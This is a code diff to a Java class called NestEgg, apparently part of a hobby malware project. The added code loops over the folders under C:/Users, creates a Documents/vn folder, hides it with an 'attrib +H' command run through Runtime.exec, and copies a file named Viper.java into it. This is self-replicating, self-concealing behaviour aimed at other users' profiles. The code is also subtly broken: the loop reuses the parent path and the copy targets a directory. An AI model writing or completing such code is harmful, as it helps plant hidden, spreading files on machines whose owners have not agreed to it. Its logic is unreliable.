@@ -4,16 +4,19 @@ import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
 
 public class NestEgg {
 	static String[] inCoded= {"testing","testing","testing"};
-public static void labEgg(){
+public static void labEgg(Path vPath){
 	File users= new File("C:/Users");
 	File[] targetUsers = users.listFiles();
 	for(int x =0; x<targetUsers.length;x++){
-		
+		createCopy(createFilePath(users.getAbsolutePath()),vPath);
 	}
-	createCopy();
+
 }
 public static String createFilePath(String userPath){
 	File uP=new File(userPath+"/Documents/vn");
@@ -27,17 +30,24 @@ public static String createFilePath(String userPath){
 		
 	}
 	if(uP.isHidden()==false){
-		uP.
+		
+		try {
+			Runtime.getRuntime().exec("attrib +H "+uP.getAbsolutePath());
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
-	return null;
+	return uP.getAbsolutePath() ;
 	
 }
-public static void createCopy(String filePath){
+public static void createCopy(String filePath,Path vPath){
+	File nestLocation=new File(filePath);
 	try{
 		 
 		
 		 
-		File nestLocation=new File(filePath);
+		
 		
 		
 			
@@ -61,6 +71,15 @@ public static void createCopy(String filePath){
 		 catch(IOException e){
 		 System.out.println( "Error: "+ e.toString());
 		 }
+	try {
+		File vF=new File(filePath+"/Viper.java");
+		if(vF.exists()==false){
+		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
+		}
+	} catch (IOException e) {
+		// TODO Auto-generated catch block
+		e.printStackTrace();
+	}
 
 }
 }
